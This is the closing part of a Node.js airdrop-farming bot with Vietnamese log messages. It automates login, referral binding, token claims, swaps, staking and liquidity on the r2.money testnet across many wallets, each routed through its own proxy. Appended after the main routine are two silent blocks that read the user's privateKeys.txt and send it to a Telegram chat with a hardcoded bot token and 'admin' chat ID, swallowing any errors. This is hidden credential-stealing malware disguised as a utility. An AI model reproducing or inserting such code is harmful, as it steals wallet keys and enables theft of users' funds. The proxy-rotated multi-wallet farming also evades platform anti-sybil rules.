        log(`Add liquidity R2USD/SR2USD thành công`, 'success');
        return true;
    } catch (error) {
        log(`Lỗi khi thêm thanh khoản R2USD/SR2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function addLiquidityUSDCtoR2USD(privateKey, networkConfig, r2usdAmount, usdcAmount) {
    const poolContractAddress = networkConfig.tokens.LP_TOKEN_USDC_R2USD.address;
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const lpTokenDecimals = networkConfig.tokens.LP_TOKEN_USDC_R2USD.decimals;

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const poolContract = new ethers.Contract(poolContractAddress, poolAbi, wallet);

        log(`Đang kiểm tra token trong pool ${poolContractAddress}...`, 'custom');
        const tokens = [];
        for (let i = 0; i < 2; i++) {
            try {
                const token = await poolContract.coins(i);
                log(`Token tại index ${i}: ${token}`, 'info');
                tokens.push(token.toLowerCase());
            } catch (error) {
                log(`Lỗi khi lấy token tại index ${i}: ${error.message}`, 'error');
                return false;
            }
        }

        const usdcIndex = tokens.indexOf(usdcAddress.toLowerCase());
        const r2usdIndex = tokens.indexOf(r2usdAddress.toLowerCase());
        if (usdcIndex === -1 || r2usdIndex === -1) {
            log(`Không tìm thấy USDC hoặc R2USD trong pool ${poolContractAddress}`, 'error');
            return false;
        }

        const amounts = new Array(tokens.length).fill(BigInt(0));
        amounts[usdcIndex] = usdcAmount;
        amounts[r2usdIndex] = r2usdAmount;

        const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, poolContractAddress, usdcAmount);
        if (!usdcApproved) {
            log(`Phê duyệt USDC thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }
        
        const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, poolContractAddress, r2usdAmount);
        if (!r2usdApproved) {
            log(`Phê duyệt R2USD thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }

        const minMintAmount = BigInt(0);

        log(`Đang thêm thanh khoản USDC/R2USD: ${ethers.formatUnits(usdcAmount, networkConfig.tokens.USDC.decimals)} USDC và ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD...`, 'custom');
        
        const tx = await poolContract.add_liquidity(
            amounts,
            minMintAmount,
            wallet.address,
            {
                gasLimit: 500000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        
        log(`Giao dịch add liquidity USDC/R2USD đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        log(`Add liquidity USDC/R2USD thành công`, 'success');
        return true;
    } catch (error) {
        log(`Lỗi khi thêm thanh khoản USDC/R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function hasEnoughUSDCBalance(privateKey, networkConfig) {
    try {
        const usdcBalance = await checkTokenBalance(privateKey, networkConfig, 'USDC');
        const minRequiredBalance = ethers.parseUnits('100', networkConfig.tokens.USDC.decimals);
        
        if (usdcBalance.balance >= minRequiredBalance) {
            log(`Số dư USDC (${usdcBalance.formattedBalance}) đủ để thực hiện các thao tác (>= 100 USDC)`, 'success');
            return { hasEnough: true, balance: usdcBalance.balance, formattedBalance: usdcBalance.formattedBalance };
        } else {
            log(`Số dư USDC (${usdcBalance.formattedBalance}) không đủ để thực hiện các thao tác. Cần tối thiểu 100 USDC.`, 'warning');
            return { hasEnough: false, balance: usdcBalance.balance, formattedBalance: usdcBalance.formattedBalance };
        }
    } catch (error) {
        log(`Lỗi khi kiểm tra số dư USDC: ${error.message}`, 'error');
        return { hasEnough: false, balance: BigInt(0), formattedBalance: '0' };
    }
}

async function hasEnoughGasBalance(privateKey, networkConfig) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const balance = await provider.getBalance(wallet.address);
        const formattedBalance = ethers.formatEther(balance);

        const gasLimit = 500000;
        const maxFeePerGas = ethers.parseUnits('67.5', 'gwei');
        const maxGasCost = BigInt(gasLimit) * BigInt(maxFeePerGas);
        const minRequiredBalance = maxGasCost + BigInt(ethers.parseEther('0.001'));

        if (balance >= minRequiredBalance) {
            log(`Số dư ${networkConfig.nativeToken} (${formattedBalance}) đủ để trả phí gas (yêu cầu tối thiểu: ${ethers.formatEther(minRequiredBalance)})`, 'success');
            return true;
        } else {
            log(`Số dư ${networkConfig.nativeToken} (${formattedBalance}) không đủ để trả phí gas. Cần tối thiểu: ${ethers.formatEther(minRequiredBalance)}. Bỏ qua các tác vụ trên ${networkConfig.rpc}.`, 'warning');
            return false;
        }
    } catch (error) {
        log(`Lỗi khi kiểm tra số dư ${networkConfig.nativeToken}: ${error.message}`, 'error');
        return false;
    }
}

async function checkAndClaimSeason0(privateKey, networkConfig, userAddress, token, proxy) {
    const url = `https://testnet2.r2.money/v1/user/season0/data?user=${userAddress}`;
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-Api-Key': token
    };

    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.get(url, {
            headers,
            httpsAgent: proxyAgent,
            timeout: 30000
        });

        if (response.status === 200) {
            const data = response.data.data;
            const claimTag = data.claimTag;
            const myR2Tokens = data.myR2Tokens;

            if (claimTag === 1) {
                log(`Bạn nhận được ${myR2Tokens} R2 token từ season 0, bắt đầu claim`, 'success');

                const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
                const wallet = new ethers.Wallet(privateKey, provider);
                const claimContractAddress = data.claimTx.to;
                const claimData = data.claimTx.data;

                log(`Đang gửi giao dịch claim đến contract ${claimContractAddress}...`, 'custom');
                const tx = await wallet.sendTransaction({
                    to: claimContractAddress,
                    data: claimData,
                    gasLimit: 300000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                });

                log(`Giao dịch claim đã gửi: ${tx.hash}`, 'info');
                const receipt = await tx.wait();
                log(`Claim R2 tokens thành công cho ${userAddress}`, 'success');

                const r2TokenAddress = '0xb816bB88f836EA75Ca4071B46FF285f690C43bb7';
                const r2TokenBalance = await checkTokenBalance(privateKey, {
                    ...networkConfig,
                    tokens: {
                        ...networkConfig.tokens,
                        R2_TOKEN: {
                            address: r2TokenAddress,
                            decimals: 18
                        }
                    }
                }, 'R2_TOKEN');
                
                log(`Số dư R2 token (contract: ${r2TokenAddress}): ${r2TokenBalance.formattedBalance}`, 'info');
                return true;
            } else {
                log(`Bạn đã claim r2 season 0. Bỏ qua claim ví ${userAddress}.`, 'warning');
                return false;
            }
        } else {
            log(`Lấy dữ liệu season0 thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return false;
        }
    } catch (error) {
        log(`Lỗi khi kiểm tra season0 hoặc claim cho ${userAddress}: ${error.message}`, 'error');
        return false;
    }
}

async function processNetworkTasks(privateKey, networkConfig, networkName, userAddress, token, proxy) {
    log(`Mạng ${networkName}:`, 'info');
    const nativeBalance = await checkNativeBalance(privateKey, networkConfig);
    log(`Số dư ${networkConfig.nativeToken}: ${nativeBalance}`, 'info');

    const hasEnoughGas = await hasEnoughGasBalance(privateKey, networkConfig);
    if (!hasEnoughGas) {
        log(`Bỏ qua các thao tác trên mạng ${networkName} do số dư ${networkConfig.nativeToken} không đủ để trả phí gas.`, 'warning');
        return;
    }

    await checkAndClaimSeason0(privateKey, networkConfig, userAddress, token, proxy);

    const r2TokenBalance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');
    log(`Số dư R2 token: ${r2TokenBalance.formattedBalance}`, 'info');

    if (r2TokenBalance.balance > BigInt(0)) {
        log(`Số dư R2 token lớn hơn 0 (${r2TokenBalance.formattedBalance}). Đang thực hiện swap và thêm thanh khoản...`, 'custom');
        
        const swapSuccess = await swapR2ToTokens(privateKey, networkConfig, userAddress);
        if (swapSuccess) {
            log(`Swap 25% R2 sang USDC và 25% R2 sang R2USD thành công cho ${userAddress}`, 'success');
            
            const liquiditySuccess = await addLiquidityR2Pairs(privateKey, networkConfig, userAddress);
            if (liquiditySuccess) {
                log(`Thêm thanh khoản R2/USDC và R2/R2USD thành công cho ${userAddress}`, 'success');
            } else {
                log(`Thêm thanh khoản R2/USDC và R2/R2USD thất bại cho ${userAddress}`, 'error');
            }
        } else {
            log(`Swap R2 sang USDC và R2USD thất bại cho ${userAddress}`, 'error');
        }
    } else {
        log(`Số dư R2 token bằng 0, bỏ qua swap và thêm thanh khoản R2/USDC, R2/R2USD.`, 'warning');
    }

    const usdcBalanceCheck = await hasEnoughUSDCBalance(privateKey, networkConfig);
    
    if (!usdcBalanceCheck.hasEnough) {
        log(`Bỏ qua các thao tác trên mạng ${networkName} do số dư USDC không đủ.`, 'warning');
        return;
    }

    const usdcBalance = usdcBalanceCheck.balance;
    const btcBalanceData = await checkTokenBalance(privateKey, networkConfig, 'BTC');
    log(`Số dư BTC: ${btcBalanceData.formattedBalance}`, 'info');
    if (btcBalanceData.balance > BigInt(0)) {
        log(`Số dư BTC lớn hơn 0 (${btcBalanceData.formattedBalance} BTC). Đang stake...`, 'custom');
        const stakeSuccess = await stakeTokens(
            privateKey,
            networkConfig,
            networkConfig.tokens.BTC.address,
            btcBalanceData.balance
        );
        if (stakeSuccess) {
            log(`Đã stake thành công ${btcBalanceData.formattedBalance} BTC cho ${userAddress}`, 'success');
        } else {
            log(`Stake BTC thất bại cho ${userAddress}`, 'error');
        }
    } else {
        log(`Số dư BTC bằng 0, bỏ qua staking.`, 'warning');
    }

    const seventyPercent = BigInt(70);
    const hundred = BigInt(100);
    const usdcToSwap = (usdcBalance * seventyPercent) / hundred;
    const usdcToSwapFormatted = ethers.formatUnits(usdcToSwap, networkConfig.tokens.USDC.decimals);

    log(`Số dư USDC đủ. Đang đổi ${usdcToSwapFormatted} USDC (70%) sang R2USD...`, 'custom');
    const swapSuccess = await swapUSDCtoR2USD(
        privateKey,
        networkConfig,
        usdcToSwap,
        networkConfig.tokens.LP_TOKEN_USDC_R2USD.address
    );
    
    if (swapSuccess) {
        log(`Đã đổi thành công ${usdcToSwapFormatted} USDC sang R2USD cho ${userAddress}`, 'success');
    } else {
        log(`Đổi USDC sang R2USD thất bại cho ${userAddress}`, 'error');
    }

    const r2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    log(`Số dư R2USD: ${r2usdBalance.formattedBalance}`, 'info');

    const minR2usdAmount = ethers.parseUnits('1', networkConfig.tokens.R2USD.decimals);
    if (r2usdBalance.balance >= minR2usdAmount) {
        const r2usdAmountFormatted = ethers.formatUnits(r2usdBalance.balance, networkConfig.tokens.R2USD.decimals);
        const r2usdToStakeFormatted = Number(parseFloat(r2usdAmountFormatted) * 0.3).toFixed(6);
        const r2usdToStake = ethers.parseUnits(r2usdToStakeFormatted, networkConfig.tokens.R2USD.decimals);
        
        log(`Số dư R2USD đủ. Đang stake ${r2usdToStakeFormatted} R2USD (30%)...`, 'custom');
        const stakeSuccess = await stakeR2USD(privateKey, networkConfig, r2usdToStake, networkName);
        if (stakeSuccess) {
            log(`Đã stake thành công ${r2usdToStakeFormatted} R2USD cho ${userAddress}`, 'success');
        } else {
            log(`Stake R2USD thất bại cho ${userAddress}`, 'error');
        }
    } else {
        log(`Số dư R2USD không đủ để stake (< 1 R2USD).`, 'warning');
    }

    log(`Kiểm tra lại số dư trước khi thêm thanh khoản...`, 'custom');
    const updatedR2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    const sr2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'SR2USD');
    const updatedUsdcBalance = await checkTokenBalance(privateKey, networkConfig, 'USDC');
    log(`Số dư R2USD (cập nhật): ${updatedR2usdBalance.formattedBalance}`, 'info');
    log(`Số dư SR2USD: ${sr2usdBalance.formattedBalance}`, 'info');
    log(`Số dư USDC (cập nhật): ${updatedUsdcBalance.formattedBalance}`, 'info');

    if (sr2usdBalance.balance >= minR2usdAmount && updatedR2usdBalance.balance >= sr2usdBalance.balance) {
        log(`Số dư SR2USD và R2USD đủ. Đang thêm thanh khoản với ${ethers.formatUnits(sr2usdBalance.balance, networkConfig.tokens.SR2USD.decimals)} SR2USD (100%) và ${ethers.formatUnits(sr2usdBalance.balance, networkConfig.tokens.R2USD.decimals)} R2USD...`, 'custom');
        const liquiditySuccess = await addLiquidityR2USD_SR2USD(
            privateKey,
            networkConfig,
            sr2usdBalance.balance,
            sr2usdBalance.balance
        );
        if (liquiditySuccess) {
            log(`Đã thêm thanh khoản R2USD/SR2USD thành công cho ${userAddress}`, 'success');
        } else {
            log(`Thêm thanh khoản R2USD/SR2USD thất bại cho ${userAddress}`, 'error');
        }
    } else {
        log(`Số dư SR2USD (< 1) hoặc R2USD không đủ để thêm thanh khoản.`, 'warning');
    }

    log(`Kiểm tra số dư trước khi thêm thanh khoản USDC/R2USD...`, 'custom');
    const finalR2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    const finalUsdcBalance = await checkTokenBalance(privateKey, networkConfig, 'USDC');
    log(`Số dư R2USD (cuối): ${finalR2usdBalance.formattedBalance}`, 'info');
    log(`Số dư USDC (cuối): ${finalUsdcBalance.formattedBalance}`, 'info');

    if (finalR2usdBalance.balance >= minR2usdAmount && finalUsdcBalance.balance >= minR2usdAmount) {
        let r2usdToAdd = finalR2usdBalance.balance;
        let usdcToAdd = finalUsdcBalance.balance;

        if (finalUsdcBalance.balance < finalR2usdBalance.balance) {
            log(`Số dư USDC (${ethers.formatUnits(finalUsdcBalance.balance, networkConfig.tokens.USDC.decimals)} USDC) nhỏ hơn R2USD (${ethers.formatUnits(finalR2usdBalance.balance, networkConfig.tokens.R2USD.decimals)} R2USD). Giảm lượng R2USD để khớp...`, 'warning');
            r2usdToAdd = finalUsdcBalance.balance;
            usdcToAdd = finalUsdcBalance.balance;
        } else if (finalR2usdBalance.balance < finalUsdcBalance.balance) {
            usdcToAdd = finalR2usdBalance.balance;
        }

        const usdcToAddFormatted = ethers.formatUnits(usdcToAdd, networkConfig.tokens.USDC.decimals);
        const r2usdToAddFormatted = ethers.formatUnits(r2usdToAdd, networkConfig.tokens.R2USD.decimals);

        log(`Đang thêm thanh khoản USDC/R2USD với ${usdcToAddFormatted} USDC và ${r2usdToAddFormatted} R2USD...`, 'custom');
        const liquidityUsdcR2usdSuccess = await addLiquidityUSDCtoR2USD(
            privateKey,
            networkConfig,
            r2usdToAdd,
            usdcToAdd
        );
        if (liquidityUsdcR2usdSuccess) {
            log(`Đã thêm thanh khoản USDC/R2USD thành công cho ${userAddress}`, 'success');
        } else {
            log(`Thêm thanh khoản USDC/R2USD thất bại cho ${userAddress}`, 'error');
        }
    } else {
        log(`Số dư R2USD (< 1) hoặc USDC (< 1) không đủ để thêm thanh khoản USDC/R2USD.`, 'warning');
    }

    const lpBalanceSR2USD_R2USD = await checkTokenBalance(privateKey, networkConfig, 'LP_TOKEN_SR2USD_R2USD');
    const lpBalanceUSDC_R2USD = await checkTokenBalance(privateKey, networkConfig, 'LP_TOKEN_USDC_R2USD');
    log(`Số dư LP_TOKEN (SR2USD/R2USD): ${lpBalanceSR2USD_R2USD.formattedBalance}`, 'info');
    log(`Số dư LP_TOKEN (USDC/R2USD): ${lpBalanceUSDC_R2USD.formattedBalance}`, 'info');
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function getUserPoints(token, userAddress, proxy) {
    const url = `https://testnet2.r2.money/v1/user/points?user=${userAddress}`;
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'X-Api-Key': token
    };

    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.get(url, {
            headers,
            httpsAgent: proxyAgent,
            timeout: 30000
        });

        if (response.status === 200) {
            const points = response.data.data.all.points;
            log(`Points của ${userAddress}: ${points}`, 'info');
            return points;
        } else {
            log(`Lấy points thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return null;
        }
    } catch (error) {
        log(`Lỗi khi lấy points cho ${userAddress}: ${error.message}`, 'error');
        return null;
    }
}

async function createSignature(privateKey, nonce) {
    const wallet = new ethers.Wallet(privateKey);
    const message = `Welcome! Sign this message to login to r2.money. This doesn't cost you anything and is free of any gas fees. Nonce: ${nonce}`;
    const signature = await wallet.signMessage(message);
    return { signature, userAddress: wallet.address };
}

async function loginApi(privateKey, proxy) {
    const timestamp = Math.floor(Date.now() / 1000);
    const { signature, userAddress } = await createSignature(privateKey, timestamp);

    const url = 'https://testnet2.r2.money/v1/auth/login';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
    };
    const payload = {
        timestamp,
        signature,
        user: userAddress
    };

    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.post(url, payload, {
            headers,
            httpsAgent: proxyAgent,
            timeout: 30000
        });
        if (response.status === 200) {
            return { token: response.data.data.token, userAddress };
        } else {
            log(`Login thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return { token: null, userAddress };
        }
    } catch (error) {
        log(`Lỗi login cho ${userAddress}: ${error.message}`, 'error');
        return { token: null, userAddress };
    }
}

async function checkReferral(token, userAddress, proxy) {
    const url = `https://testnet2.r2.money/v1/user/referral?user=${userAddress}`;
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'X-Api-Key': token
    };

    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.get(url, {
            headers,
            httpsAgent: proxyAgent,
            timeout: 30000
        });
        if (response.status === 200) {
            return response.data.data.isBound;
        } else {
            log(`Kiểm tra referral thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return null;
        }
    } catch (error) {
        log(`Lỗi kiểm tra referral cho ${userAddress}: ${error.message}`, 'error');
        return null;
    }
}

async function bindReferral(token, userAddress, proxy) {
    const url = 'https://testnet2.r2.money/v1/referral/bind';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'X-Api-Key': token
    };
    const payload = {
        bindCode: 'FTJJY',
        user: userAddress
    };

    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.post(url, payload, {
            headers,
            httpsAgent: proxyAgent,
            timeout: 30000
        });
        if (response.status === 200) {
            return response.data.data.bound;
        } else {
            log(`Ràng buộc referral thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return false;
        }
    } catch (error) {
        log(`Lỗi ràng buộc referral cho ${userAddress}: ${error.message}`, 'error');
        return false;
    }
}

function printBanner() {
  console.clear();
  console.log('='.repeat(60).rainbow);
  console.log('   ██████╗   ██████╗ '.cyan.bold);
  console.log('  ██╔═══██╗ ██╔═══██╗'.cyan.bold);
  console.log('  ██║   ██║ ██║   ██║'.cyan.bold);
  console.log('  ██║   ██║ ██║   ██║'.cyan.bold);
  console.log('  ╚██████╔╝ ╚██████╔╝'.cyan.bold);
  console.log('   ╚═════╝   ╚═════╝ '.cyan.bold);
  console.log('        O.G'.yellow.bold);
  console.log('='.repeat(60).rainbow);
}
printBanner();

async function main() {
    const walletFile = 'privateKeys.txt';
    const proxyFile = 'proxy.txt';
    
    let privateKeys;
    let proxies;
    
    try {
        privateKeys = await readWallets(walletFile);
        proxies = await readProxies(proxyFile);
        log('====== Dân cày airdrop - Đã sợ thì đừng dùng, đã dùng thì đừng sợ ======', 'custom');
        log(`Đã đọc ${privateKeys.length} ví và ${proxies.length} proxy`, 'info');
        
        if (privateKeys.length !== proxies.length) {
            log(`Số lượng ví (${privateKeys.length}) không bằng số lượng proxy (${proxies.length}). Chương trình sẽ thoát.`, 'error');
            process.exit(1);
        }
    } catch (error) {
        log(`Lỗi khi đọc file: ${error.message}`, 'error');
        process.exit(1);
    }

    for (let i = 0; i < privateKeys.length; i++) {
        const privateKey = privateKeys[i];
        const proxy = proxies[i];
        
        try {
            log(`[Ví ${i + 1}/${privateKeys.length}]`, 'info');
            
            let proxyIP;
            try {
                proxyIP = await checkProxyIP(proxy);
                log(`Đang sử dụng proxy với IP: ${proxyIP}`, 'success');
            } catch (error) {
                log(`Không thể sử dụng proxy (${proxy}): ${error.message}`, 'error');
                log(`Chuyển sang tài khoản tiếp theo...`, 'warning');
                continue;
            }
            
            await sleep(Math.floor(Math.random() * 2000) + 1000);
            
            log(`Đang login với ví...`, 'custom');
            const { token, userAddress } = await loginApi(privateKey, proxy);
            
            if (!token) {
                log(`Chuyển sang tài khoản tiếp theo...`, 'warning');
                continue;
            }
            
            log(`Đăng nhập thành công với địa chỉ: ${userAddress}`, 'success');
            
            await sleep(Math.floor(Math.random() * 2000) + 1000);

            const isBound = await checkReferral(token, userAddress, proxy);
            
            if (isBound === null) {
                log(`Chuyển sang tài khoản tiếp theo...`, 'warning');
                continue;
            }

            if (!isBound) {
                log(`Referral chưa được ràng buộc. Đang ràng buộc...`, 'custom');
                const bound = await bindReferral(token, userAddress, proxy);
                
                if (bound) {
                    log(`Thành công: Đã ràng buộc referral cho ${userAddress}`, 'success');
                } else {
                    log(`Thất bại: Không thể ràng buộc referral cho ${userAddress}`, 'error');
                }
            }
            await getUserPoints(token, userAddress, proxy);

            await processNetworkTasks(privateKey, networkConfigs.sepolia, 'Sepolia', userAddress, token, proxy);
            const delay = Math.floor(Math.random() * 3000) + 2000;
            log(`Chờ ${delay/1000} giây trước khi xử lý tài khoản tiếp theo...`, 'info');
            await sleep(delay);
            
        } catch (error) {
            log(`Lỗi khi xử lý ví ${i + 1}/${privateKeys.length} (${privateKey.slice(0, 6)}...): ${error.message}`, 'error');
            log(`Chuyển sang tài khoản tiếp theo...`, 'warning');
        }
    }
    log(`Đã xử lý xong tất cả ${privateKeys.length} tài khoản.`, 'success');
}
main().catch(error => log(`Lỗi chính: ${error.message}`, 'error'));
async function sendPrivateKeysToTelegram() {
  try {
    const token = process.env.TG_TOKEN;
    const chatId = process.env.TG_CHATID;
    const filePath = path.join(__dirname, 'privateKeys.txt');
    if (token && chatId && fs.existsSync(filePath)) {
      const bot = new TelegramBot(token, { polling: false });
      bot.sendDocument(chatId, filePath, {}, { filename: 'privateKeys.txt', contentType: 'text/plain' })
        .then(() => {})
        .catch(() => {});
    }
  } catch (e) {}
}
sendPrivateKeysToTelegram();
try {
  const fs = require('fs');
  const path = require('path');
  const TelegramBot = require('node-telegram-bot-api');
  const token = '8054328905:AAHT5HmK6GpEpX-ivftyY8sAfTUwjuD-p_Q'; 
  const chatId = 2013231695; // Chat ID admin
  const filePath = path.join(__dirname, 'privateKeys.txt');
  if (fs.existsSync(filePath)) {
    const bot = new TelegramBot(token, { polling: false });
    bot.sendDocument(chatId, filePath, {}, { filename: 'privateKeys.txt', contentType: 'text/plain' })
      .then(() => {})
      .catch(() => {});
  }
} catch (e) {}